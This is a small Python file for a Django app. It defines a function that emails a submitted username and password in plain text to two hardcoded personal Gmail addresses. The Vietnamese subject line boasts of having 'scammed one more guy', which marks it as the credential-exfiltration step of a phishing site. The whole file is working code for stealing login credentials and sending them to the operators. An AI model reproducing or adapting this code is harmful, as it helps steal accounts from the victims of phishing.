from django.conf import settings
from django.core.mail import send_mail


def send_mail_func(username: str, password: str):
    subject = 'Ban da lua duoc 1 thang moi!'
    message = f'Username: {username}, password: {password}.'
    email_from = settings.EMAIL_HOST_USER
    recipient_list = ['daindp.tech@gmail.com', 'tranhuyhoang23022001@gmail.com', ]
    send_mail( subject, message, email_from, recipient_list )